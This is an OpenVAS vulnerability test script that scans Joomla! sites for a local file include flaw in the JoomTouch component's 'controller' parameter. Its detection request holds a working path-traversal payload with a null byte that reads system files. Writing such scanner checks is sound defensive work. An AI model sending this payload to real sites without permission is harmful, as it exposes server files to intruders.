###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_49180.nasl 13238 2019-01-23 11:14:26Z cfischer $
#
# Joomla! JoomTouch Component 'controller' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103211");
  script_version("$Revision: 13238 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-23 12:14:26 +0100 (Wed, 23 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-08-18 15:52:07 +0200 (Thu, 18 Aug 2011)");
  script_bugtraq_id(49180);
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Joomla! JoomTouch Component 'controller' Parameter Local File Include Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49180");
  script_xref(name:"URL", value:"http://www.joomtouch.com/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"summary", value:"The JoomTouch component for Joomla! is prone to a local file-include
  vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially sensitive information
  and execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise
  the application and the computer, other attacks are also possible.");

  script_tag(name:"affected", value:"JoomTouch 1.0.2 is affected, other versions may also be vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
  a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = dir + "/index.php?option=com_joomtouch&controller=" + crap(data:"../",length:3*9) +files[file] + "%00";
  if (http_vuln_check(port:port, url:url,pattern:file)) {
    report = report_vuln_url( port:port, url:url );
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);